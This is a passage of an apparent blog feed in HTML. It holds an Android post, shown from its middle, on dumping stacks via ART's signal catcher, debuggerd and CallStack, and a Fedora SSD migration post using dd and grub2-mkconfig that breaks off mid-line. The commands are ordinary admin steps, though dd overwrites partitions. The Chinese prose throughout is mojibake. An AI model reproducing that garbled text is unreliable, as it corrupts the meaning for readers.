aren&#x27;t attributed to an app.</span></span><br><span class="line">  heap_-&gt;<span class="built_in">ResetGcPerformanceInfo</span>();</span><br><span class="line">  <span class="keyword">if</span> (!is_system_server &amp;&amp;</span><br><span class="line">      !safe_mode_ &amp;&amp;</span><br><span class="line">      (jit_options_-&gt;<span class="built_in">UseJitCompilation</span>() || jit_options_-&gt;<span class="built_in">GetSaveProfilingInfo</span>()) &amp;&amp;</span><br><span class="line">      jit_.<span class="built_in">get</span>() == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">// Note that when running ART standalone (not zygote, nor zygote fork),</span></span><br><span class="line">    <span class="comment">// the jit may have already been created.</span></span><br><span class="line">    <span class="built_in">CreateJit</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">StartSignalCatcher</span>();</span><br><span class="line">  <span class="comment">// Start the JDWP thread. If the command-line debugger flags specified &quot;suspend=y&quot;,</span></span><br><span class="line">  <span class="comment">// this will pause the runtime, so we probably want this to come last.</span></span><br><span class="line">  Dbg::<span class="built_in">StartJdwp</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºézygoteçš„è¿›ç¨‹éƒ½ä¼šå¯åŠ¨ Signal Catcherçš„ çº¿ç¨‹.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@shamu:/ # ps -t 2089</span><br><span class="line">USER      PID   PPID  VSIZE  RSS   WCHAN            PC  NAME</span><br><span class="line">u0_a58    2089  386   1565280 53732 SyS_epoll_ b6cb0894 S com.hujiang.dict:pushservice</span><br><span class="line">u0_a58    2092  2089  1565280 53732 do_sigtime b6cb0b68 S Signal Catcher</span><br><span class="line">u0_a58    2095  2089  1565280 53732 unix_strea b6cb194c S JDWP</span><br><span class="line">u0_a58    2096  2089  1565280 53732 futex_wait b6c875e8 S ReferenceQueueD</span><br><span class="line">u0_a58    2097  2089  1565280 53732 futex_wait b6c875e8 S FinalizerDaemon</span><br><span class="line">u0_a58    2099  2089  1565280 53732 futex_wait b6c875e8 S FinalizerWatchd</span><br><span class="line">u0_a58    2100  2089  1565280 53732 futex_wait b6c875e8 S HeapTaskDaemon</span><br><span class="line">u0_a58    2101  2089  1565280 53732 binder_thr b6cb09c0 S Binder_1</span><br><span class="line">u0_a58    2102  2089  1565280 53732 binder_thr b6cb09c0 S Binder_2</span><br><span class="line">u0_a58    2107  2089  1565280 53732 SyS_epoll_ b6cb0894 S Thread-123</span><br><span class="line">u0_a58    2108  2089  1565280 53732 futex_wait b6c875e8 S taskService-pro</span><br><span class="line"></span><br><span class="line">zygote è‡ªå·±æ²¡æœ‰è¯¥çº¿ç¨‹.</span><br><span class="line"></span><br><span class="line">root@shamu:/ # ps | grep -i zy</span><br><span class="line">root      386   1     1528448 67416 poll_sched b6cb0a5c S zygote</span><br><span class="line"></span><br><span class="line">127|root@shamu:/ # ps -t 386</span><br><span class="line">USER      PID   PPID  VSIZE  RSS   WCHAN            PC  NAME</span><br><span class="line">root      386   1     1528448 67416 poll_sched b6cb0a5c S zygote</span><br><span class="line">root      2203  386   1528448 67416 futex_wait b6c875e8 S ReferenceQueueD</span><br><span class="line">root      2204  386   1528448 67416 futex_wait b6c875e8 S FinalizerDaemon</span><br><span class="line">root      2205  386   1528448 67416 futex_wait b6c875e8 S FinalizerWatchd</span><br><span class="line">root      2206  386   1528448 67416 futex_wait b6c875e8 S HeapTaskDaemon</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/signal_catcher.cc">https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/signal_catcher.cc</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SignalCatcher::Output</span><span class="params">(<span class="type">const</span> std::string&amp; s)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (stack_trace_file_.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">    <span class="built_in">LOG</span>(INFO) &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SignalCatcher::HandleSigQuit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Runtime* runtime = Runtime::<span class="built_in">Current</span>();</span><br><span class="line">  std::ostringstream os;</span><br><span class="line">  os &lt;&lt; <span class="string">&quot;\n&quot;</span></span><br><span class="line">      &lt;&lt; <span class="string">&quot;----- pid &quot;</span> &lt;&lt; <span class="built_in">getpid</span>() &lt;&lt; <span class="string">&quot; at &quot;</span> &lt;&lt; <span class="built_in">GetIsoDate</span>() &lt;&lt; <span class="string">&quot; -----\n&quot;</span>;</span><br><span class="line">  <span class="built_in">DumpCmdLine</span>(os);</span><br><span class="line">  <span class="comment">// Note: The strings &quot;Build fingerprint:&quot; and &quot;ABI:&quot; are chosen to match the format used by</span></span><br><span class="line">  <span class="comment">// debuggerd. This allows, for example, the stack tool to work.</span></span><br><span class="line">  std::string fingerprint = runtime-&gt;<span class="built_in">GetFingerprint</span>();</span><br><span class="line">  os &lt;&lt; <span class="string">&quot;Build fingerprint: &#x27;&quot;</span> &lt;&lt; (fingerprint.<span class="built_in">empty</span>() ? <span class="string">&quot;unknown&quot;</span> : fingerprint) &lt;&lt; <span class="string">&quot;&#x27;\n&quot;</span>;</span><br><span class="line">  os &lt;&lt; <span class="string">&quot;ABI: &#x27;&quot;</span> &lt;&lt; <span class="built_in">GetInstructionSetString</span>(runtime-&gt;<span class="built_in">GetInstructionSet</span>()) &lt;&lt; <span class="string">&quot;&#x27;\n&quot;</span>;</span><br><span class="line">  os &lt;&lt; <span class="string">&quot;Build type: &quot;</span> &lt;&lt; (kIsDebugBuild ? <span class="string">&quot;debug&quot;</span> : <span class="string">&quot;optimized&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  runtime-&gt;<span class="built_in">DumpForSigQuit</span>(os);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="literal">false</span>)) &#123;</span><br><span class="line">    std::string maps;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ReadFileToString</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, &amp;maps)) &#123;</span><br><span class="line">      os &lt;&lt; <span class="string">&quot;/proc/self/maps:\n&quot;</span> &lt;&lt; maps;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  os &lt;&lt; <span class="string">&quot;----- end &quot;</span> &lt;&lt; <span class="built_in">getpid</span>() &lt;&lt; <span class="string">&quot; -----\n&quot;</span>;</span><br><span class="line">  <span class="built_in">Output</span>(os.<span class="built_in">str</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="type">int</span> signal_number = signal_catcher-&gt;<span class="built_in">WaitForSignal</span>(self, signals);</span><br><span class="line">    <span class="keyword">if</span> (signal_catcher-&gt;<span class="built_in">ShouldHalt</span>()) &#123;</span><br><span class="line">      runtime-&gt;<span class="built_in">DetachCurrentThread</span>();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (signal_number) &#123;</span><br><span class="line">    <span class="keyword">case</span> SIGQUIT:</span><br><span class="line">      signal_catcher-&gt;<span class="built_in">HandleSigQuit</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SIGUSR1:</span><br><span class="line">      signal_catcher-&gt;<span class="built_in">HandleSigUsr1</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">LOG</span>(ERROR) &lt;&lt; <span class="string">&quot;Unexpected signal %d&quot;</span> &lt;&lt; signal_number;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»æºç ä¸­å‘ç°é™¤äº†SIGQUIT è¿˜å¯ä»¥å‘é€ SIGUSR1 , è¿™ä¸ªä¿¡å·å¯ä»¥ä½¿è¿›ç¨‹java è™šæ‹Ÿæœºæ‰§è¡ŒGC<br>æ“ä½œ <code>kill -10 pid</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SignalCatcher::HandleSigUsr1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">LOG</span>(INFO) &lt;&lt; <span class="string">&quot;SIGUSR1 forcing GC (no HPROF)&quot;</span>;</span><br><span class="line">  Runtime::<span class="built_in">Current</span>()-&gt;<span class="built_in">GetHeap</span>()-&gt;<span class="built_in">CollectGarbage</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="â˜†-ä½¿ç”¨-debugged-å‘½ä»¤è¡Œ"><a href="#â˜†-ä½¿ç”¨-debugged-å‘½ä»¤è¡Œ" class="headerlink" title="â˜† ä½¿ç”¨ debugged å‘½ä»¤è¡Œ"></a>â˜† ä½¿ç”¨ debugged å‘½ä»¤è¡Œ</h2><p>è¿™ç§æ–¹æ³•æ˜¯å…¨ç³»ç»Ÿé€šç”¨çš„, å¯ä»¥ç”¨äºézygoteçš„è¿›ç¨‹.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Usage: -b [&lt;tid&gt;]</span><br><span class="line">  -b dump backtrace to console, otherwise dump full tombstone file</span><br></pre></td></tr></table></figure><p>é€šè¿‡ -b å‚æ•°æŒ‡å®šè¿›ç¨‹pid, å³å¯.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># debuggerd -b 23850</span><br><span class="line"></span><br><span class="line">Sending request to dump task 23850.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----- pid 23850 at 1970-01-27 03:57:11 -----</span><br><span class="line">Cmd line: /sbin/adbd</span><br><span class="line">ABI: &#x27;arm&#x27;</span><br><span class="line"></span><br><span class="line">&quot;adbd&quot; sysTid=23850</span><br><span class="line">  #00 pc 0002b158  /sbin/adbd</span><br><span class="line">  #01 pc 0002467f  /sbin/adbd</span><br><span class="line">  #02 pc 00020854  [stack]</span><br><span class="line"></span><br><span class="line">&quot;adbd&quot; sysTid=23851</span><br><span class="line">  #00 pc 0002fd38  /sbin/adbd</span><br><span class="line">  #01 pc 0002a501  /sbin/adbd</span><br><span class="line">  #02 pc 0000000b  &lt;unknown&gt;</span><br><span class="line"></span><br><span class="line">&quot;adbd&quot; sysTid=23852</span><br><span class="line">  #00 pc 0002b624  /sbin/adbd</span><br><span class="line">  #01 pc 000106cf  /sbin/adbd</span><br><span class="line">  #02 pc 00010301  /sbin/adbd</span><br><span class="line">  #03 pc 0002a613  /sbin/adbd</span><br><span class="line">  #04 pc 00030283  /sbin/adbd</span><br><span class="line"></span><br><span class="line">&quot;adbd&quot; sysTid=23853</span><br><span class="line">  #00 pc 0002b628  /sbin/adbd</span><br><span class="line">  #01 pc 00013999  /sbin/adbd</span><br><span class="line">  #02 pc 000112ed  /sbin/adbd</span><br><span class="line">  #03 pc 000104e1  /sbin/adbd</span><br><span class="line">  #04 pc 0002a613  /sbin/adbd</span><br><span class="line">  #05 pc 00030283  /sbin/adbd</span><br><span class="line"></span><br><span class="line">&quot;adbd&quot; sysTid=23862</span><br><span class="line">  #00 pc 0002b888  /sbin/adbd</span><br><span class="line">  #01 pc 0000a503  /sbin/adbd</span><br><span class="line">  #02 pc 00009527  /sbin/adbd</span><br><span class="line">  #03 pc 0002a613  /sbin/adbd</span><br><span class="line">  #04 pc 00030283  /sbin/adbd</span><br><span class="line"></span><br><span class="line">----- end 23850 -----</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><h2 id="â˜†-java-ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ"><a href="#â˜†-java-ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ" class="headerlink" title="â˜† java ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ"></a>â˜† java ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line"> ...  </span><br><span class="line">&#125; <span class="keyword">catch</span> (RemoteException e) &#123;  </span><br><span class="line">  e.printStackTrace();  </span><br><span class="line">  ...  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="â˜†-C-ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ"><a href="#â˜†-C-ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ" class="headerlink" title="â˜† C++ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ"></a>â˜† C++ä»£ç ä¸­æ‰“å°è°ƒç”¨æ ˆ</h2><p>CallStack.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utils/CallStack.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    android::CallStack stack;</span><br><span class="line">    stack.<span class="built_in">update</span>(); </span><br><span class="line">    stack.<span class="built_in">dump</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Android.mk</p><figure class="highlight make"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH:= <span class="variable">$(<span class="built_in">call</span> my-<span class="built_in">dir</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(CLEAR_VARS)</span></span><br><span class="line">LOCAL_SRC_FILES:= CallStack.cpp</span><br><span class="line">LOCAL_SHARED_LIBRARIES += libutils</span><br><span class="line">LOCAL_LDLIBS += -ldl -lutils</span><br><span class="line"></span><br><span class="line">LOCAL_CFLAGS := <span class="variable">$(common_CFLAGS)</span></span><br><span class="line">LOCAL_MODULE := CallStack</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(BUILD_EXECUTABLE)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåæ˜¾ç¤ºç±»ä¼¼ä¸‹é¢çš„ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@shamu:/data/local/tmp # ./CallStack</span><br><span class="line">#00 pc 000006d1  /data/local/tmp/CallStack</span><br><span class="line">#01 pc 00017359  /system/lib/libc.so (__libc_init+44)</span><br><span class="line">#02 pc 0000074c  /data/local/tmp/CallStack</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;â˜†-ä½¿ç”¨kill-å‘é€-SIGNAL-QUIT&quot;&gt;&lt;a href=&quot;#â˜†-ä½¿ç”¨kill-å‘é€-SIGNAL-QUIT&quot; class=&quot;headerlink&quot; title=&quot;â˜† ä½¿ç”¨kill å‘é€ SIGNAL_QUIT&quot;&gt;&lt;/a&gt;â˜† ä½¿ç”¨kill å‘é€ SIGNA</summary>
      
    
    
    
    
    <category term="Android" scheme="http://usmacd.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>SSD è¿ç§»è®°</title>
    <link href="http://usmacd.com/2021/11/03/ssd/"/>
    <id>http://usmacd.com/2021/11/03/ssd/</id>
    <published>2021-11-03T01:46:03.591Z</published>
    <updated>2021-11-03T01:46:03.591Z</updated>
    
    <content type="html"><![CDATA[<p>ç”±äºæŸäº›éœ€æ±‚ï¼Œå†³å®šä¸ŠSSDï¼Œæé«˜ä¸€ä¸‹ç¡¬ç›˜è¯»å†™é€Ÿåº¦ã€‚ä¸ŠäºŒæ‰‹ä¸œä¹°äº†ä¸‰æ˜Ÿ(SAMSUNG) 860 EVO<br>æœ€åˆçš„æƒ³æ³•æ˜¯ä½œä¸ºæ•°æ®ç›˜ä½¿ç”¨ï¼Œå³æ“ä½œç³»ç»Ÿè¿˜æ˜¯è·‘åœ¨æœºæ¢°ç¡¬ç›˜ä¸Šï¼Œä»”ç»†ä¸€æ€è€ƒï¼Œè¿˜æ˜¯æŠ˜è…¾<br>ä¸€ä¸‹ï¼Œè¦ä¸å®åœ¨æ˜¯æœ‰äº›æµªè´¹ï¼Œäº‹å®è¯æ˜ï¼ŒæŠ˜è…¾æ˜¯å€¼å¾—çš„ï¼Œæ„Ÿè§‰å°±æƒ³é£ä¸€æ ·ã€‚</p><p>é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹åŸå§‹çš„æƒ…å†µï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mount</span><br><span class="line"></span><br><span class="line">/dev/sda1 on /boot <span class="built_in">type</span> ext4 (rw,relatime,seclabel,stripe=4)</span><br><span class="line">/dev/mapper/fedora-root on / <span class="built_in">type</span> ext4 (rw,relatime,seclabel)</span><br></pre></td></tr></table></figure><p>å½“ç„¶é¦–å…ˆè¦æŠŠSSDå¤„ç†ä¸€ä¸‹ï¼Œå®‰è£…ä¸€ä¸‹ gparted å›¾å½¢åŒ–ç•Œé¢å¾ˆå¥½ç”¨ã€‚å»ºä¸ªåˆ†åŒºè¡¨ï¼Œé€‰æ‹©<br>gptï¼Œåˆ†ä¸ªåŒºï¼Œ&#x2F;dev&#x2F;mapper&#x2F;fedora-root å¤§å°ä¸º50Gï¼Œå…ˆåˆ†ä¸ª50Gçš„åˆ†åŒºï¼Œå‰©ä¸‹çš„å…¨éƒ¨ç»™<br>å¦å¤–ä¸€ä¸ªåˆ†åŒºï¼Œæ ¼å¼åŒ–ä¸º ext4ã€‚æ“ä½œå®Œæˆåï¼Œç”¨fdisk æŸ¥çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ fdisk -l</span><br><span class="line"></span><br><span class="line">Disk /dev/sdbï¼š232.9 GiBï¼Œ250059350016 å­—èŠ‚ï¼Œ488397168 ä¸ªæ‰‡åŒº</span><br><span class="line">å•å…ƒï¼šæ‰‡åŒº / 1 * 512 = 512 å­—èŠ‚</span><br><span class="line">æ‰‡åŒºå¤§å°(é€»è¾‘/ç‰©ç†)ï¼š512 å­—èŠ‚ / 512 å­—èŠ‚</span><br><span class="line">I/O å¤§å°(æœ€å°/æœ€ä½³)ï¼š512 å­—èŠ‚ / 512 å­—èŠ‚</span><br><span class="line">ç£ç›˜æ ‡ç­¾ç±»å‹ï¼šgpt</span><br><span class="line">ç£ç›˜æ ‡è¯†ç¬¦ï¼š</span><br><span class="line"></span><br><span class="line">è®¾å¤‡            èµ·ç‚¹      æœ«å°¾      æ‰‡åŒº   å¤§å° ç±»å‹</span><br><span class="line">/dev/sdb1       2048 104859647 104857600    50G Linux æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">/dev/sdb2  104859648 488396799 383537152 182.9G Linux æ–‡ä»¶ç³»ç»Ÿ</span><br></pre></td></tr></table></figure><p>å°†åŸæ¥ç³»ç»Ÿçš„ &#x2F; dd åˆ°æ–°çš„SSDï¼Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/mapper/fedora-root of=/dev/sdb1 bs=1M</span><br></pre></td></tr></table></figure><p>ç”¨æ–°çš„root æŠŠç³»ç»Ÿå¯åŠ¨èµ·æ¥ï¼Œreboot åè¿›å…¥å¼•å¯¼ç•Œé¢ï¼ŒæŒ‰e ç¼–è¯‘ï¼Œæ‰¾åˆ°<br>root&#x3D;&#x2F;dev&#x2F;fedora&#x2F;root æ”¹ä¸º root&#x3D;&#x2F;dev&#x2F;sdb1 æŒ‰ ctrl+x å¯åŠ¨ï¼Œä¸€ä¼šå„¿å°±è¿›ç³»ç»Ÿäº†ï¼Œé€Ÿåº¦<br>æå‡å¾ˆå¤§ã€‚ç°åœ¨éœ€è¦æŠŠ grub.cfg æ›´æ–°ä¸€ä¸‹ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯æ‰‹åŠ¨ä¿®æ”¹è¿›å…¥äº†æ–°çš„æ ¹ï¼Œå¦‚æœé‡å¯<br>çš„è¯ï¼Œè¿˜æ˜¯ä¼šä½¿ç”¨è€çš„æ ¹ï¼Œå› ä¸ºgrub.cfg é‡Œå°±æ˜¯è¿™ä¹ˆå†™çš„ã€‚</p><p>è¦ç”Ÿæˆæ–°çš„grub.cfg éœ€è¦ä½¿ç”¨grub2-mkconfig, å‘½ä»¤å¾ˆç®€å•</p><p><code>$ grub2-mkconfig -o /boot/grub2/grub.cfg</code></p><p>æ‰§è¡Œåé‡å¯ï¼Œmd æ€ä¹ˆåˆè¿›åˆ°è€æ ¹å»äº†ã€‚è¿™é‡ŒæŠ˜è…¾äº†å¥½ä¹…ï¼Œç¬¬ä¸€ä¸ªé—®é¢˜fedora çš„å†…æ ¸å‡ºbug<br>äº†ï¼Œæ¯æ¬¡é‡å¯éƒ½è¦ç­‰å¾…éå¸¸ä¹…çš„æ—¶é—´ï¼Œæ‰€ä»¥éœ€è¦å‡çº§ï¼Œæ‰€ä»¥æ­£ç¡®çš„é¡ºåºåº”è¯¥æ˜¯å…ˆå‡çº§ç³»ç»Ÿå†<br>ddï¼Œæ²¡åŠæ³•å‡çº§ç³»ç»Ÿé‡æ–° dd</p><p>è§£å†³äº†fedora å†…æ ¸çš„é—®é¢˜åï¼Œå‘ç°è¿˜æ˜¯è¿›ä¸åˆ°æ–°æ ¹ã€‚åªè¦è®¤çœŸåœ°çœ‹ grub.cfg, grub2 æ”¹åŠ¨<br>æŒºå¤§ï¼Œä¸å¤ªç†Ÿæ‚‰äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#                                      </span><br><span class="line"># DO NOT EDIT THIS FILE                                                                                                                                                                       #                                                   </span><br><span class="line"># It is automatically generated by grub2-mkconfig using templates                                                                                                                             </span><br><span class="line"># from /etc/grub.d and settings from /etc/default/grub</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æœ‰ä¸¤ä¸ªä¿¡æ¯ï¼Œç¡®å®æ˜¯ä½¿ç”¨ grub2-mkconfig ç”Ÿæˆï¼Œ&#x2F;etc&#x2F;default&#x2F;grub é‡Œæœ‰é…ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/default/grub</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GRUB_TIMEOUT=5</span><br><span class="line">GRUB_DISTRIBUTOR=&quot;$(sed &#x27;s, release .*$,,g&#x27; /etc/system-release)&quot;</span><br><span class="line">GRUB_DEFAULT=saved</span><br><span class="line">GRUB_DISABLE_SUBMENU=true</span><br><span class="line">GRUB_TERMINAL_OUTPUT=&quot;console&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX=&quot;rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1 rd.lvm.lv=fedora/root rd.lvm.lv=fedora/swap rhgb quiet&quot;                                      </span><br><span class="line">GRUB_DISABLE_RECOVERY=&quot;true&quot;</span><br></pre></td></tr></table></figure><p>grub2-mkconfig é‡Œç”¨è¿™å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRUB_DEVICE=&quot;`$&#123;grub_probe&#125; --target=device /`&quot;  </span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒæŸ¥çœ‹ç»“æœï¼Œ å‘ç°æ­£ç¡®</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ grub2-probe --target=device /</span><br><span class="line"></span><br><span class="line">/dev/sdb1</span><br></pre></td></tr></table></figure><p>å¯æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½æ­£ç¡®å¯åŠ¨å‘¢ï¼Œçœ‹çœ‹ç”Ÿæˆçš„ grub.cfg æ–‡ä»¶</p><p>linux16 &#x2F;vmlinuz-4.17.2-200.fc28.x86_64 root&#x3D;UUID&#x3D;290a98e3-7937-49db-a971-4d0e49567cf0</p><p>ä½¿ç”¨çš„æ˜¯ UUIDï¼Œå¹¶ä¸æ˜¯ &#x2F;dev, æŸ¥çœ‹ä¸€ä¸‹å„åˆ†åŒºçš„ uuid</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># blkid</span></span><br><span class="line"></span><br><span class="line">/dev/sdb1: UUID=<span 